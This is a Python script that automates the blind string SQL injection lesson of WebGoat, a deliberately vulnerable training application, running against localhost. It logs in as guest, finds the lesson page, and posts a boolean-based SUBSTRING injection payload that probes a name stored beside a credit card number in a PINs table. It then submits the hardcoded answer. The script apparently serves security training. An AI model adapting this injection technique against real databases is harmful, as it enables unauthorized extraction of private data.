import requests
import sys
import re
import argparse
import json

def blindSQLString(fileName):

	#start a session
	session = requests.Session()
	#request the login page
	getSession = session.get('http://127.0.0.1:8080/WebGoat/login.mvc')

	try:
		#get the anonymous session token
		cookieVal = getSession.cookies

		payload = {'username': 'guest', 'password': 'guest'}
		#log in to the website with the anonymous session token and username&password
		result = session.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check;jsessionid=' + str(cookieVal['JSESSIONID']), data = payload)

		#get random screen and menu numbers, to begin parsing for specific screen and menu numbers
		randomScreenAndMenu = session.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')

		#split the server response after the name of the specific attack
		specificScreenAndMenu = randomScreenAndMenu.text.split('Blind String SQL Injection')
		#only want the second half of the split, this contains the screen and menu numbers
		#e.g. Screen=2862&menu=1100"...
		isolateScreenAndMenu = specificScreenAndMenu[1].split("Screen=")

		#print isolateScreenAndMenu[1]

		#isolate the screen value from the rest of the string, gets rid of 'Screen=' portion
		#e.g. 2862&menu=1100"...
		screenParse = isolateScreenAndMenu[1].split("&menu=")
		#now only have the screen value isolated
		screenVal = screenParse[0]

		#print screenVal #screen number

		#now split on the " (double quote) after the menu value
		#e.g. &menu=1100"
		menu = screenParse[1].split("\"")
		#now only have the menu value isolated
		menuVal = menu[0]

		#print menuVal #menu number

		#access the specific attack page we are looking for
		vulnPage = session.get('http://127.0.0.1:8080/WebGoat/attack?Screen=' + screenVal + '&menu=' + menuVal)
		#print vulnPage.text

		#find the first letter of the name on the account
		payload = {'account_number': '101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number=\'4321432143214321\'), 1, 1) < \'K\' );', 'SUBMIT': 'Go!'}
		attempt1 = session.post('http://127.0.0.1:8080/WebGoat/attack?Screen=' + screenVal + '&menu=' + menuVal, data = payload)
		#print attempt1.text

		#if this prints that means that we have successfully guessed the first letter of the name
		if "Account number is valid" in attempt1.text:
			#parse out the invalid account number portion
			isLetterCorrect = attempt1.text.split("'Go!'><p>")
			verifyLetterCorrect = isLetterCorrect[1].split('</form>')
			letterCorrect = verifyLetterCorrect[0]
			print letterCorrect

		#we know the correct name is 'Jill', so we post that in the account number slot
		#if we were to do the attack fully, we would have to go letter-by-letter through the name
		payload = {'account_number': 'Jill', 'SUBMIT': 'Go!'}
		attempt2 = session.post('http://127.0.0.1:8080/WebGoat/attack?Screen=' + screenVal + '&menu=' + menuVal, data = payload)
		#print attempt1.text

		#if this prints that means that we have successfully guessed the name
		if "* Congratulations. You have successfully completed this lesson." in attempt2.text:
			didItPass = attempt2.text.split('<BR>')
			verifyItPassed = didItPass[1].split('<')
			itPassed = verifyItPassed[0]
			#print itPassed
			print 'Congratulations.'
		
	except Exception as e:
		print e



fileName = "Vuln-22.attack"
blindSQLString(fileName)